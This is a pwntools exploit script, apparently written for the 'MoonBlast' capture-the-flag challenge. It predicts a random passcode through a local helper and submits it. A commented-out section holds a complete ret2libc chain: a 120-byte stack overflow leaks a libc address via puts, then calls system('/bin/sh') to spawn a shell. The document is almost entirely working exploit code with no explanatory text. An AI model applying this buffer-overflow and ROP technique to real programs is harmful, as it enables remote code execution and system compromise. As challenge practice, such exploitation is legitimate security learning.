from pwn import *
import os

context.log_level='debug'
# context.terminal=['tmux','splitw','-h']
context.arch='amd64'

os.system('./rand > rand.txt')
rand_int = 0
with open("rand.txt") as f:
    for num in f:
        rand_int = eval(num.strip())

r = process("./MoonBlast") # to test locally
# r = remote("ash-chal.firebird.sh", 36031) # to crack remotely

elf = ELF("./MoonBlast")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") # local libc
# libc = ELF("libc.so.6") # remote libc (libc6_2.27-3ubuntu1.5_amd64.so)
libc = ELF("./libc/libc6_2.35-0ubuntu3_amd64.so") # test

recv = r.recvline()
recv = r.recvuntil(b'Please enter the passcode: ')
r.sendline(bytes(str(rand_int), encoding='utf8'))

r.interactive()

# pop_rdi_addr_ret = 0x400a13 # ROPgadget --binary MoonBlast --only "pop|ret" | grep "rdi"
# # 0x0000000000400a13 : pop rdi ; ret

# payload = b'a'*120
# payload += flat(pop_rdi_addr_ret, elf.got['read'], elf.plt['puts'], elf.sym['command'])
# recv = r.recvuntil(b'Please enter your command: ')
# r.sendline(payload)
# r.recvuntil("Command received!\n")
# recv = r.recvline()
# print(f"recevied: [{recv}]")
# libc_base = u64(recv[:-1].ljust(8, b'\x00')) - libc.symbols['read']
# print("libc_base: ", hex(libc_base))
# print("read addr: ", hex(libc_base+libc.symbols['read']))

# sys_addr = libc_base+libc.symbols['system']
# sh_addr = libc_base+next(libc.search(b'/bin/sh'))
# ret_addr = 0x4006ae # ROPgadget --binary MoonBlast --only "ret"
# # 0x00000000004006ae : ret
# recv = r.recvuntil(b'Please enter your command: ')
# payload = b'a'*120+flat(pop_rdi_addr_ret, sh_addr, ret_addr, sys_addr)
# r.sendline(payload)

# r.interactive()
